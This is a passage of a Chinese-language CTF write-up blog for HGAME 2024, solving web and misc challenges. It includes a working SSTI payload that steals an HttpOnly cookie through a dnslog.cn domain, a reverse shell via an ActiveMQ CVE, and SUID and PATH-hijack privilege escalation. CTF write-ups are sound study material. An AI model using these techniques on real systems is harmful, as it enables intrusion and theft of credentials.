+<h4 id="梅开二度"><a href="#梅开二度" class="headerlink" title="梅开二度"></a>梅开二度</h4><p>go题，go的<code>SSTI</code>及模板过滤的绕过，<code>HttpOnly Cookie</code>的获取</p>
+<p>给了源码自己在<code>GoLand</code>build一下环境，修改一下源码可以更好地获知内部情况</p>
+<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &#x27;/&#x27; 使用bytes.Buffer来捕获模板执行的输出</span></span><br><span class="line">		<span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line">		_ = tmpl.Execute(&amp;buf, c)</span><br><span class="line">		fmt.Println(buf.String())</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x27;/bot&#x27; 修改一下chromedp运行内容，输出HTML、</span></span><br><span class="line">			<span class="keyword">var</span> htmlContent <span class="type">string</span></span><br><span class="line">			ctx, _ = context.WithTimeout(ctx, <span class="number">20</span>*time.Second)</span><br><span class="line">			<span class="keyword">if</span> err := chromedp.Run(ctx,</span><br><span class="line">				chromedp.Navigate(u.String()),</span><br><span class="line">				chromedp.Sleep(time.Second*<span class="number">10</span>),</span><br><span class="line">				chromedp.OuterHTML(<span class="string">&quot;html&quot;</span>, &amp;htmlContent),</span><br><span class="line">			); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Println(err)</span><br><span class="line">			&#125;</span><br><span class="line">			fmt.Println(htmlContent)</span><br><span class="line"><span class="comment">//  &#x27;/flag&#x27; 简单粗暴换成了字符串</span></span><br><span class="line">		flag := <span class="string">&quot;hgame&#123;Tac0_St4r_Tue2d4y_vm450&#125;&quot;</span></span><br><span class="line">		c.SetCookie(<span class="string">&quot;flag&quot;</span>, flag, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>攻击路径基本确定，就是用<code>/bot</code>在同一个Chromedp浏览器中先访问<code>/flag</code>拿到flag所在的cookie，再通过<code>/</code>用模板构建JavaScript语句使Chromedp对cookie进行处理后携带出来。</p>
+<p>实现方法主要是要找到可以利用的<code>gin *context</code>自带函数，因为<code>html.EscapeString()</code>转义了单双引号，所以能利用的空间很小，查go package可以找到一些直接返回字符串的和一些会产生可控点的函数，而其中能利用的其实不多。稳定且可知的最后想到是<code>.ClientIP</code>&#x3D;127.0.0.1，然后可以被<code>/bot</code>携带进<code>/</code>的只有URL，所以能用来绕过模板检测的就是<code>.Query</code>配合<code>.ClientIP</code>，设计一个<code>&#123;&#123;.Query .ClientIP&#125;&#125;&amp;127.0.0.1=</code>绕过模板检测实现控制Chromedp执行的网页</p>
+<p>后面获取cookie的时候用<code>|</code>传参，<code>&#123;&#123;.Query .ClientIP|.GetHeader&#125;&#125;&amp;127.0.0.1=Cookie</code></p>
+<p>然后是JavaScript部分，通过三个<code>fetch</code>来访问路由，进行处理</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">     <span class="title function_">fetch</span>(<span class="string">&quot;/?tmpl=&#123;&#123;.Query%20.ClientIP|.GetHeader&#125;&#125;&amp;127.0.0.1=Cookie&quot;</span>)</span><br><span class="line">     .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">     .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> &#123;</span><br><span class="line">         <span class="title function_">fetch</span>(<span class="string">&quot;//&quot;</span> 	<span class="comment">//利用协议相对url绕过对http的拦截</span></span><br><span class="line">         + text.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">map</span>(<span class="function"><span class="params">char</span> =&gt;</span> char.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">substring</span>(<span class="number">100</span>)	<span class="comment">//处理为ASCII使之能成为子域</span></span><br><span class="line">         + <span class="string">&quot;.szjcq3.dnslog.cn&quot;</span>)		<span class="comment">//dnslog域名</span></span><br><span class="line">    &#125;) </span><br><span class="line">&#125;, <span class="number">1000</span>)	<span class="comment">//延时一秒</span></span><br></pre></td></tr></table></figure></div>
+
+<p>有几个容易忽略的地方，一个是要通过两层<code>urlencode</code>的方法确保参数正确传入<code>/</code>，尤其要注意<code>+</code>和<code>;</code> ，一个是访问<code>/flag</code>要加延迟确保浏览器将cookie设置好再fetch &#x2F;，还有一个是这里传入的参数不用加双引号 <del>内层的Cookie那里加了双引号卡死了很久</del></p>
+<p>最后用<code>dnslog</code>的方法，<code>substring(0%2C%2055)</code> <code>substring(50%2C%20105)</code> <code>substring(100)</code>分三次带出ascii码形式的cookie以免URL过长，合并后转换出flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240214164348927.png"
+                      alt="dnslog"
+                ></p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">EXP</span><span class="punctuation">: </span>未优化版，没使用相对路由</span><br><span class="line">/bot?url=http%3A%2F%2F127.0.0.1%3A8080%2F%3Ftmpl%3D%7B%7B.Query%2520.ClientIP%7D%7D%26127.0.0.1%3D%3CSCRIPT%3Efetch(%27http%3A%2F%2F127.0.0.1%3A8080%2Fflag%27)%253BsetTimeout(()%20%3D%3E%20%7Bfetch(%22http%253A%252F%252F127.0.0.1%253A8080%252F%253Ftmpl%253D%257B%257B.Query%252520.ClientIP%257C.GetHeader%257D%257D%2526127.0.0.1%253DCookie%22).then(response%20%3D%3E%20response.text()).then(text%20%3D%3E%20%7B%20fetch(%22%2F%2F%22%252Btext.split(%27%27).map(char%20%3D%3E%20char.charCodeAt(0)).join(%27%27).substring(100)%252B%22.szjcq3.dnslog.cn%22)%7D)%7D%2C%201000)%3C%2FSCRIPT%3E</span><br></pre></td></tr></table></figure></div>
+
+<p><del>唉，好菜的我，玉玉了</del></p>
+<h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h4><p>流量分析题，先看了HTTP流，有个<code>GET /ek1ng.jpg</code>的请求，追踪这个HTTP流，发现响应是<code>Content-Length: image/jpeg</code>，点一下响应内容定位到具体位置，右键<code>File Data-显示分组字节</code>，flag就在图片底部  <del>本来秒了，我当时一直在搞把内容复制粘贴出来然后改成jpg，不熟练遭大罪</del></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206224301271.png"
+                      alt="ekgf"
+                ></p>
+<h4 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h4><p>引擎得知Word是富文本格式，可以直接改成zip然后解压，在解压后的文件夹内部<code>.\word\media</code>放着flag和两张图，因为提到水印所以猜测是盲水印<del>一开始因为两个格式不一样把各种隐写都试了一遍</del> </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206230139811.png"
+                      alt="bw"
+                ></p>
+<p>用这个密码可以把压缩包打开，里面的是<code>spam letter</code>+<code>ROT8000</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206230333652.png"
+                      alt="spam"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206230436642.png"
+                      alt="ROT8000"
+                ></p>
+<h4 id="龙之舞"><a href="#龙之舞" class="headerlink" title="龙之舞"></a>龙之舞</h4><p>先听了听，一开始有一段尖锐波动，猜测是频谱隐写，用<code>Audacity</code>多视图放大看一下，镜像后获得key<del>不镜像也行</del></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206231440178.png"
+                      alt="KeyZip"
+                ></p>
+<p>然后通过文件名得到线索，用<code>DeepSound</code>解出压缩包 <del>但我是第一步先找wav隐写找到了d3的BadW3ter，然后再去找频谱里的密码的</del></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206232232282.png"
+                      alt="deepsound"
+                ></p>
+<p>压缩包里面是龙之舞.gif，把gif拆分发现了二维码碎片，拼接起来无法直接识别，<del>想到了当时线下讲MISC时候的古登堡那题，但是没提示肯定不会这么搞</del>猜测可能是<code>Mask</code>和<code>纠错等级</code>被改过了，利用<code>qrazybox</code>手动爆破出结果并decode</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240206232653781.png"
+                      alt="FormatQR"
+                ></p>
+<h2 id="WEEK3-4"><a href="#WEEK3-4" class="headerlink" title="WEEK3&amp;4"></a>WEEK3&amp;4</h2><h3 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WebVPN"><a href="#WebVPN" class="headerlink" title="WebVPN"></a>WebVPN</h4><p>网页版代理，获取flag的路径是先完成登录，可在源码中找到user信息，包含username和password</p>
+<p>然后通过<code>POST /user/info</code> 利用update函数基于js原型链污染来使strategy带上目标</p>
+<p>因为proxy的判定是基于<code>.hostname</code>，所以只需带上<code>127.0.0.1</code>即可 <strong>如果是<code>127.0.0.1:3000</code>会导致服务器端返回的header出现错误，返回500而非flag</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240218231947892.png"
+                      alt="image-20240218231947892"
+                ></p>
+<p>完成污染后利用proxy访问flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240218231950777.png"
+                      alt="image-20240218231950777"
+                ></p>
+<h4 id="Reverse-and-Escalation"><a href="#Reverse-and-Escalation" class="headerlink" title="Reverse and Escalation."></a>Reverse and Escalation.</h4><p>ActiveMQ-RCE，先用admin admin登录管理端，查到版本有洞可以直接利用</p>
+<p>CVE-2023-46604</p>
+<p>POC来源: <a class="link"   href="https://github.com/X1r0z/ActiveMQ-RCE" >https://github.com/X1r0z/ActiveMQ-RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>改一下poc.xml如何放到VPS上，发送信息反弹shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240223224641987.png"
+                      alt="Rprocess"
+                ></p>
+<p>activemq用户权限不够读不了flag，要提权，利用<code>find</code>提权然后读取flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240223224558874.png"
+                      alt="Eprocess"
+                ></p>
+<h4 id="Reverse-and-Escalation-Ⅱ"><a href="#Reverse-and-Escalation-Ⅱ" class="headerlink" title="Reverse and Escalation Ⅱ."></a>Reverse and Escalation Ⅱ.</h4><p>还是一样的方法拿到shell，但是用<code>find</code>命令时出现了<del>莫名其妙的</del>加法题目</p>
+<p>看到hint说要逆向，于是把<code>/usr/bin/find</code>用base64编码输出，再用python还原了可执行文件</p>
+<p>逆了一下的结果</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; argc; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % <span class="number">23333</span>;</span><br><span class="line">    v6 = rand() % <span class="number">23333</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d + %d = \n&quot;</span>, v7, v6);</span><br><span class="line">    <span class="keyword">if</span> ( v7 + v6 != atoi(argv[i]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong answer!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = atoi(argv[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d correct!\n&quot;</span>, v4);</span><br><span class="line">    <span class="keyword">if</span> ( ++v9 &gt; <span class="number">38</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      setuid(<span class="number">0</span>);</span><br><span class="line">      system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>用当前时间作为种子生成随机数，所以用c写了个程序可以制造出一样的随机数，然后构建表达式调用find就能通过加法检验了</p>
+<p>（一开始试了试bash脚本，但是随机数的生成方式不一样）</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* poc_RE.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v7;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    v3 = time(<span class="number">0LL</span>);</span><br><span class="line">    srand(v3);</span><br><span class="line">    <span class="type">char</span> work[<span class="number">500</span>]=<span class="string">&quot;find &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = rand() % <span class="number">23333</span>;</span><br><span class="line">        v6 = rand() % <span class="number">23333</span>;</span><br><span class="line">        <span class="type">char</span> towork[<span class="number">10</span>];</span><br><span class="line">        <span class="built_in">sprintf</span>(towork, <span class="string">&quot;%d&quot;</span>, v7 + v6);</span><br><span class="line">        <span class="built_in">strcat</span>(towork, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(work, towork);</span><br><span class="line">    &#125;</span><br><span class="line">    system(work);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>靶机上是没有gcc的，所以就在vps上编译然后部署，连上靶机用wget获取，之后<code>chmod 777</code>赋予执行权限</p>
+<p>然后报错了，glibc的版本不兼容，所以在vps上用docker起了个和靶机一样的debian11来编译</p>
+<div class="highlight-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> debian:<span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> poc_RE.c /usr/src/poc_RE.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.tuna.tsinghua.edu.cn/g&#x27;</span> /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update &amp;&amp; apt-get install -y gcc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr/src</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gcc poc_RE.c -o poc_RE</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /output &amp;&amp; <span class="built_in">cp</span> exp_DP /output/poc_RE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;/output&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动容器后再用docker cp命令把容器内的poc_RE复制出来</span></span><br></pre></td></tr></table></figure></div>
+
+<p>成功通过检验获得了<code>ls</code>的输出结果 <del>然后就卡住了</del> </p>
+<p>问了一下获得提示，用环境变量劫持命令执行。</p>
+<p>因为执行<code>ls</code>的时候会根据<code>$PATH</code>来寻找可执行文件，所以在环境变量前面加上自建路径就能让命令执行自己设置的可执行文件；而<code>find</code>此时已经<code>setuid(0)</code>，所以可以用于读取flag</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pwd = /opt/activemq</span></span><br><span class="line"><span class="built_in">touch</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cat /flag&quot;</span> &gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">export</span> PATH = /opt/activemq:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/post/HGAME2024/image-20240227200833948.png"
+                      alt="RE2flag"
+                ></p>
+<h3 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h3><h4 id="与ai聊天"><a href="#与ai聊天" class="headerlink" title="与ai聊天"></a>与ai聊天</h4><p>反向复读，<del>这样子肯定不是ai</del>，检索到 <a class="link"   href="https://blog.skk.moe/post/hackergame-2020-write-up/#Zi-Fu-Du-De-Fu-Du-Ji" >hackergame2020-自复读的复读机 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 正向自复读：_=&#x27;_=%r;print (_%%_)&#x27;;print (_%_) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">_=<span class="string">&#x27;)]1-::[_%%_(tnirp;%r=_&#x27;</span>;<span class="built_in">print</span>(_%_[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h4><p>分析流量可知是sql盲注的记录，分析request可找出字符串各个位置上的值，目标应该是password字段</p>
+<p>先将host导出，比对<code>geek</code>得出查询规律，<del>人脑</del>分析得出password的字符串，逆序输出转化后结果</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">AStr = <span class="string">&quot;125 102 50 102 97 56 50 57 53 99 56 51 100 45 54 99 97 98 45 56 57 101 52 45 53 50 55 49 45 55 101 102 97 98 97 98 99 123 103 97 108 102 44&quot;</span></span><br><span class="line"></span><br><span class="line">Alist = AStr.split()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">reversed</span>(Alist)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ,flag&#123;cbabafe7-1725-4e98-bac6-d38c5928af2f&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="ezKeyboard"><a href="#ezKeyboard" class="headerlink" title="ezKeyboard"></a>ezKeyboard</h4><p>流量分析，看<code>GET DESCRIPTOR Response CONFIGURATION</code>，1.2是键盘流量，<code>usb.src == &quot;1.2.3&quot;</code>筛选出按键信息，导出然后用脚本分析</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">              <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">              <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">              <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;BS&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>,</span><br><span class="line">              <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;`&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">              <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">              <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">             <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">             <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">             <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span 